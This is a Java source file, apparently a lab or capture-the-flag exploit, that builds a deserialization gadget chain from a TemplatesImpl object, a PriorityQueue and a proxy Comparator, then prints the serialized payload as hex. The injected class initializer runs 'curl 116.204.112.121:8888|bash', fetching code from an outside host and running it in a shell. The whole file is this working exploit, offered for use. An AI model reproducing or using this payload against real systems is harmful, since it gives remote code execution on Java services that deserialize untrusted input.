package com.yxxx.javasec.deserialize;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.PriorityQueue;

public class Exp9 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception {
        ClassPool classpool = ClassPool.getDefault();
        classpool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass class_s = classpool.get(Exp9.class.getName());
        CtClass class_f = classpool.get(Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet").getName());
        class_s.setSuperclass(class_f);
        class_s.makeClassInitializer().insertAfter("java.lang.Runtime.getRuntime().exec(\"curl 116.204.112.121:8888|bash\");");
        TemplatesImpl templates = TemplatesImpl.class.newInstance();

        setFieldValue(templates, "_name", "zpchcbd_test");
        setFieldValue(templates, "_bytecodes", new byte[][]{class_s.toBytecode()});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(2);

        MyInvocationHandler myInvocationHandler = new MyInvocationHandler();
        setFieldValue(myInvocationHandler, "type", Templates.class);
        Comparator comparator = (Comparator)Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Comparator.class}, myInvocationHandler);
        setFieldValue(priorityQueue, "comparator", comparator);

        Field field_queue = PriorityQueue.class.getDeclaredField("queue");
        field_queue.setAccessible(true);
        Object[] innerArr = (Object[]) field_queue.get(priorityQueue);
        innerArr[0] = templates;
        innerArr[1] = templates;

        System.out.println(Utils.objectToHexString(priorityQueue));
    }

}
